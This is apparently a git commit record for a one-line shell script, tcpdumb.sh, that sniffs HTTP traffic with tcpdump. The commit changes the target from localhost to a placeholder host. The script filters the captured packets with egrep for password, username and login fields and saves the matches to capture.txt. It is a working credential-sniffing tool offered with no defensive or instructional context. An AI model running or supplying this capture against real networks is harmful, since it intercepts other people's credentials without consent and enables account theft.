aeaaaba78766991bdef0c9647a0ff15024a5fc09
Arivan199 <63254290+Arivan199@users.noreply.github.com>
2020-08-21 12:10:41 +0530

    Update tcpdumb.sh

--- tcpdumb.sh
+++ tcpdumb.sh
@@ -1,1 +1,1 @@
-sudo tcpdump port http or host 127.0.0.1|egrep -i 'pwd=|password=|passwd=|pass=|user=|login=|user=|username=|pw=|passw=|passwd|pass:|user:|username:|password:|login:|pass |' >> capture.txt
+sudo tcpdump port http or host anything.com|egrep -i 'pwd=|password=|passwd=|pass=|user=|login=|user=|username=|pw=|passw=|passwd|pass:|user:|username:|password:|login:|pass |' >> capture.txt
